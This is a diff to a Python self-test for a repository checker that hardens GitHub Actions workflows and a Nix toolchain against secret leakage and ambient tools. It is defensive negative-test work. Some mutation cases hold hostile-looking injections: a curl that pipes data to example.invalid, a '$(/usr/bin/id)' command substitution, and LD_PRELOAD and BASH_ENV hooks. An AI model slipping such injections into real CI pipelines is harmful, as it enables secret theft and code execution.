@@ -119,8 +119,116 @@ def main() -> None:
                             f"{obsolete_source}: ${{{{ secrets.{obsolete_source} }}}}"))
     expect_red(replace_text(author, "JEV_API_KEY: ${{ secrets.JEV_API_KEY }}", "JEV_API_KEY: fixture-literal"))
     expect_red(replace_text(author, "SOPS_AGE_RECIPIENTS: ${{ vars", "AGE_RECIPIENTS: ${{ vars"))
-    expect_red(replace_text(project, "          WRANGLER_PACKAGE:",
-                            "          EXTRA: ${{ secrets.EXTRA }}\n          WRANGLER_PACKAGE:"))
+    expect_red(replace_text(project, "          CLOUDFLARE_ACCOUNT_ID:",
+                            "          EXTRA: ${{ secrets.EXTRA }}\n          CLOUDFLARE_ACCOUNT_ID:"))
+
+    # The effect entry must stay repo-owned: no ambient tool, runtime acquisition, or unlocked closure.
+    entry = '"$ENVS_EFFECT_BIN/envs-effect" --root "$GITHUB_WORKSPACE"'
+    build = "nix build .#effect-toolchain --no-update-lock-file"
+    identity_step = "      - name: Record effect toolchain identity\n"
+    expect_red(replace_text(author, f"{entry} author", "python3 adapters/jev_api.py author"))
+    expect_red(replace_text(project, f"{entry} project", "nix shell .#effect-toolchain -c envs-effect project"))
+    expect_red(replace_text(project, f"{entry} project", f"npx --yes wrangler@4 && {entry} project"))
+    expect_red(replace_text(author, '"$tool/gh" pr create', "gh pr create"))
+    expect_red(replace_text(author, '"$tool/git" push', "git push"))
+    # Effect workflows consume the provided artifact; any rebuild or Nix install there is RED.
+    expect_red(replace_text(project, identity_step, f"      - name: Rebuild\n        run: {build}\n\n{identity_step}"))
+    expect_red(replace_text(author, identity_step, "      - name: Install Nix\n        uses: cachix/install-nix-action@"
+                            "13d8dd58da0234aa297dedd986986ccb8e7f3e24\n\n" + identity_step))
+    expect_red(lambda root: (root / "flake.lock").unlink())
+    expect_red(replace_text("flake.lock", '"rev": "', '"rev": "0'))
+    expect_red(replace_text("flake.nix", "wrangler = \"${pkgs.wrangler}", "wrangler = \"/usr/bin/wrangler"))
+    expect_red(replace_text("adapters/jev_api.py", 'wrangler = tools["wrangler"]', 'wrangler = "npx"'))
+    expect_red(replace_text(".github/workflows/check.yml", build, "nix flake show"))
+
+    # Absolute-path, chained, or rebound executables are as ambient as bare names.
+    expect_red(replace_text(author, f"{entry} author", "/usr/bin/python3 adapters/jev_api.py author"))
+    expect_red(replace_text(author, '"$tool/git" push', "/usr/bin/git push"))
+    expect_red(replace_text(project, '"$tool/gh" pr create', '"/usr/bin/gh" pr create'))
+    expect_red(replace_text(project, 'tool="$ENVS_EFFECT_BIN"', 'tool="/usr/bin"'))
+    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A; /usr/bin/curl -d @- example.invalid'))
+    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A $(/usr/bin/id)'))
+    expect_red(replace_text(project, "        run: |", "        shell: /usr/bin/bash {0}\n        run: |"))
+
+    # The closure identity is recorded by the tool itself after realization and before secrets.
+    identity = "      - name: Record effect toolchain identity\n" f"        run: '{entry} toolchain'\n\n"
+    expect_red(replace_text(author, identity, ""))
+    expect_red(replace_text(project, identity, ""))
+
+    def move_identity_after_secrets(root: Path) -> None:
+        path = root / project
+        text = path.read_text(encoding="utf-8")
+        path.write_text(text.replace(identity, "") + "\n" + identity, encoding="utf-8")
+
+    expect_red(move_identity_after_secrets)
+
+    # The committed lock must be proven Nix-generated, and the closure tools executed.
+    check = ".github/workflows/check.yml"
+    expect_red(replace_text(check, '          cmp flake.lock "$relock/flake.lock"\n', ""))
+    expect_red(replace_text(check, '          "$tool/wrangler" --version\n', ""))
+    expect_red(replace_text(check, 'pages secret "$command" --help', 'pages secret "$command"'))
+
+    # The consumer is the clean-start consumer verbatim, resolved by the dispatched SHA, before secrets.
+    consumer = "- name: Obtain provided effect artifact\n"
+    verify = '          echo "${digest#sha256:}  $art/envs-effect.zip" | sha256sum -c -\n'
+    expect_red(replace_text(author, verify, ""))
+    expect_red(replace_text(project, "ENVS_SOURCE_SHA: ${{ github.sha }}", "ENVS_SOURCE_SHA: ${{ github.event.inputs.sha }}"))
+    expect_red(replace_text(project, consumer, "- name: Obtain effect artifact\n"))
+
+    def move_consumer_after_secrets(root: Path) -> None:
+        path = root / author
+        text = path.read_text(encoding="utf-8")
+        step = next(block for block in text.split("\n\n") if consumer in block)
+        path.write_text(text.replace(step + "\n\n", "") + "\n" + step + "\n", encoding="utf-8")
+
+    expect_red(move_consumer_after_secrets)
+
+    # check provides the artifact and proves a checkout-free, Nix-free clean start with destructive cases.
+    expect_red(replace_text(check, "actions/upload-artifact@", "actions/upload-artifact-disabled@"))
+    expect_red(replace_text(check, "nix build .#effect-artifact", "nix build .#effect-toolchain"))
+    expect_red(replace_text(check, "    needs: toolchain\n", ""))
+    expect_red(replace_text(check, "    timeout-minutes: 20\n    steps:\n", "    timeout-minutes: 20\n    steps:\n"
+                            "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n\n"))
+    expect_red(replace_text(check, verify, ""))
+    expect_red(replace_text(check, 'test "$MISSING" = failure', "true"))
+    expect_red(replace_text(check, "for case in lock adapter; do", "for case in lock; do"))
+    expect_red(replace_text("flake.nix", "closureInfo { rootPaths = [ effect-toolchain ]; }", "closureInfo { rootPaths = [ ]; }"))
+    expect_red(replace_text("flake.nix", "-I ${self}/adapters/jev_api.py", "-I adapters/jev_api.py"))
+
+    # The artifact is built from, named after, and resolved by the exact commit, repository, and push producer.
+    source_ref = "          ref: ${{ github.event.pull_request.head.sha || github.sha }}\n"
+    expect_red(replace_text(check, source_ref, ""))
+    expect_red(replace_text(check, '          test "$(git rev-parse HEAD)" = "$ENVS_SOURCE_SHA"\n', ""))
+    expect_red(replace_text(check, "name: envs-effect-${{ env.ENVS_SOURCE_SHA }}",
+                            "name: envs-effect-${{ github.sha }}"))
+    expect_red(replace_text(check, "cancel-in-progress: ${{ github.event_name == 'pull_request' }}", "cancel-in-progress: true"))
+    expect_red(replace_text("flake.nix", "        echo ${rev} > SOURCE\n", ""))
+
+    def weaken_consumer(old: str, new: str):
+        def mutate(root: Path) -> None:
+            for relative in (check, author, project):
+                replace_text(relative, old, new)(root)
+
+        return mutate
+
+    expect_red(weaken_consumer('          test "$(tar -xOf "$art/content/envs-effect.tar" SOURCE)" = "$ENVS_SOURCE_SHA"\n', ""))
+    expect_red(weaken_consumer('(.event == "push" and .conclusion == "success")', '.conclusion == "success"'))
+    expect_red(weaken_consumer(" and .head_repository.full_name == $repo", ""))
+    expect_red(replace_text(check, "            '.head_repository.full_name = \"fork/envs\"' \\\n", ""))
+    expect_red(replace_text(check, "artifact built from another commit was accepted", "accepted"))
+
+    # effect-shape runs the provided artifact over a same-commit data checkout, exactly as effect jobs do.
+    expect_red(replace_text(check, '"$ENVS_EFFECT_BIN/envs-effect" --root "$GITHUB_WORKSPACE" toolchain | tee',
+                            '"$ENVS_EFFECT_BIN/envs-effect" toolchain | tee'))
+    expect_red(replace_text(check, ".source == $sha and .root == $root", ".status == \"PASS\""))
+
+    # Effect jobs accept only declared step env; nothing but the consumer may alter the step environment.
+    expect_red(replace_text(author, "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n",
+                            "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n          BASH_ENV: /tmp/hook\n"))
+    expect_red(replace_text(project, "    environment: dev-projection\n",
+                            "    environment: dev-projection\n    env:\n      LD_PRELOAD: /tmp/hook.so\n"))
+    expect_red(replace_text(project, '          tool="$ENVS_EFFECT_BIN"\n',
+                            '          tool="$ENVS_EFFECT_BIN"\n          "$tool/git" config core.hooksPath >>"$GITHUB_PATH"\n'))
     expect_red(replace_text("README.md", "dev-projection/SOPS_AGE_KEY", "dev-projection/REMOVED"))
     expect_red(replace_text("README.md", "prd-projection/CLOUDFLARE_ACCOUNT_ID", "prd-projection/REMOVED"))
     print("repository checker self-test: PASS")
